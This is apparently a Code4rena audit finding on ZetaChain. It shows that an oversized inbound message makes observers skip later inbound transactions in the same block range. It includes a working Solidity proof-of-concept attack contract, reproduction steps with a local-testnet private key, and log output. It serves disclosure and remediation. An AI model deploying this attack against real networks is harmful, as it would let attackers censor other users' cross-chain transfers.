# [H] A malicious inbound transaction can prevent subsequent events from being processed by observers

## Summary
Severity: High
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-12-17
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/416
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L859
https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L901


# Vulnerability details

## Impact

An attacker can send an inbound ERC-20 deposit or Zeta transaction with a `message` exceeding the maximum length limit and causing all other subsequent inbound transactions that occur in the same block range (i.e., `startBlock` to `toBlock`) to be ignored by the observers.

## Proof of Concept

> **Please note:** The outlined issue in this submission is different than the medium severity issue reported in "EVM RPC errors may lead to missed inbound transactions" as it can be actively exploited.

ZetaChain observers watch external EVM chains via the `ExternalChainWatcher` function that internally [calls the `observeInTX` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L725) on each `ob.GetCoreParams().InTxTicker` ticker.

The `observeInTX` function performs multiple tasks:

1. Query for zeta sent (`ZetaSent`) logs
2. Query for ERC-20 deposited logs
3. Query tx's that are sent to the TSS address

The queried blocks are bound by the range of `startBlock` and `toBlock`, which are set in lines `809-810`. The `startBlock` is the previously processed `toBlock` (i.e., retrieved via `ob.GetLastBlockHeightScanned()`), incremented by 1.

At the end of the function, [in line `988`, the `toBlock` is set as the new `lastBlockHeightScanned`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L988).

However, if calling `PostSend` in lines [`856`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L856) and [`898`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L898) errors, the `for` loop is exited early via the subsequent `return` statement.

Consequently, the `observeInTX` function proceeds to store the `toBlock` as the new `lastBlockHeightScanned`, even though the blocks (and their logs) have not been fully processed.

An attacker can exploit this issue with an inbound transaction that has a `message` exceeding the maximum length of [`MaxMessageLength = 10240`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L15). This [upper bound on the message length is enforced in the `MsgVoteOnObservedInboundTx` message's `ValidateBasic` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L88-L90) and [prevents observers from sending such a message to ZetaChain](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/tx.go#L74) as well as also preventing any further processing of the message in case it reaches ZetaChain.

Specifically, both the [`ERC20Custody.deposit`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L169) and the [`ZetaConnectorEth.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L42) function allow specifying an arbitrary `message`.

### PoC

1. Spin up the smoke tests for a local test environment via `make start-smoketest`
2. Setup Remix (or similar), Metamask (or similar) with the local ETH network and the **deployer** account (which has already sufficient Zeta tokens)
   - Private key: `d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263`
   - Address: `0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`
3. Deploy the following `SimulateAttack` Solidity contract to the local ETH network:

   ```solidity
   // SPDX-License-Identifier: GPL-3.0

   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

   interface ZetaInterfaces {
       /**
       * @dev Use SendInput to interact with the Connector: connector.send(SendInput)
       */
       struct SendInput {
           /// @dev Chain id of the destination chain. More about chain ids https://docs.zetachain.com/learn/glossary#chain-id
           uint256 destinationChainId;
           /// @dev Address receiving the message on the destination chain (expressed in bytes since it can be non-EVM)
           bytes destinationAddress;
           /// @dev Gas limit for the destination chain's transaction
           uint256 destinationGasLimit;
           /// @dev An encoded, arbitrary message to be parsed by the destination contract
           bytes message;
           /// @dev ZETA to be sent cross-chain + ZetaChain gas fees + destination chain gas fees (expressed in ZETA)
           uint256 zetaValueAndGas;
           /// @dev Optional parameters for the ZetaChain protocol
           bytes zetaParams;
       }
   }

   interface ZetaConnector {
       function send(ZetaInterfaces.SendInput calldata input) external;
   }

   contract SimulateAttack {
       ZetaConnector public connector = ZetaConnector(0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9);
       ERC20 public zeta = ERC20(0xA8D5060feb6B456e886F023709A2795373691E63);

       function simulateAttack(uint256 amount, uint256 gasLimit, uint256 length) external {
           sendMaliciousMessage(amount, gasLimit, length);

           // Pretend this message was sent by someone else in a subsequent transaction/block
           sendLegitimateMessage(1.337e18, 100_000);
       }

       function sendMaliciousMessage(uint256 amount, uint256 gasLimit, uint256 length) public {
           // Create a bytes message with a non-zero character length of length
           bytes memory message = new bytes(length);
           // fill with non-zero data
           for (uint256 i = 0; i < length; i++) {
               message[i] = bytes1(uint8(1));
           }

           ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
               1337,
               abi.encodePacked(address(this)),
               gasLimit,
               message,
               amount,
               ""
           );

           zeta.transferFrom(msg.sender, address(this), amount);
           zeta.approve(address(connector), amount);

           connector.send(input);
       }

       // Pretend this message was sent by someone else in a subsequent transaction/block
       function sendLegitimateMessage(uint256 amount, uint256 gasLimit) public {
           ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
               1337,
               abi.encodePacked(address(this)),
               gasLimit,
               "",
               amount,
               ""
           );

           zeta.transferFrom(msg.sender, address(this), amount);
           zeta.approve(address(connector), amount);

           connector.send(input);
       }
   }
   ```

4. Approve the `SimulateAttack` contract as the Zeta token spender for the deployer (`0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`) address. An unlimited allowance is recommended for simplicity.
5. With the **deployer** account, call the `simulateAttack` function with the following parameters:

   - `amount`: `3000000000000000000` (i.e., `3e18`)
   - `gasLimit`: `100000`
   - `length`: `10240` (slightly less would also work due to the observer's [internal base64 encoding](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/utils.go#L129))

   This function sends two messages (i.e., `ZetaSent` events): An attacker's message with a very long `message`, and a second legitimate message, pretending to be sent by someone else (in a different tx/block).

6. Watch the observer (zetacore) logs via `docker logs zetaclient0 -f --tail 100`
7. Notice the `ERR error posting to zeta core` error once the first event is picked up:

   ```bash
   2023-12-16T22:08:12Z INF Checking for all inTX : startBlock 411, toBlock 411 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:14Z INF Checking for all inTX : startBlock 412, toBlock 412 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:16Z INF Checking for all inTX : startBlock 413, toBlock 413 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:16Z INF TxBlockNumber 413 Transaction Hash: 0x335c2abe18cd64b10f8d60dd554c2c54ec1f8225b54ee84895a8ab795688c339 Message :  chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:16Z ERR error posting to zeta core error="/zetachain.zetacore.crosschain.MsgVoteOnObservedInboundTx invalid msg | message is too long: 13656: invalid request" chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:18Z INF Checking for all inTX : startBlock 414, toBlock 414 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:20Z INF Checking for all inTX : startBlock 415, toBlock 415 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:22Z INF Checking for all inTX : startBlock 416, toBlock 416 chain=goerli_localnet module=ExternalChainWatcher
   2023-12-16T22:08:24Z INF Checking for all inTX : startBlock 417, toBlock 417 chain=goerli_localnet module=ExternalChainWatcher
   ```

   Thereafter, the second `ZetaSent` event is ignored.

## Tools Used

Manual review

## Recommended mitigation steps

Consider only skipping the "invalid" event and continue processing the remaining events to ensure all events are processed and voted upon.



## Assessed type

Other
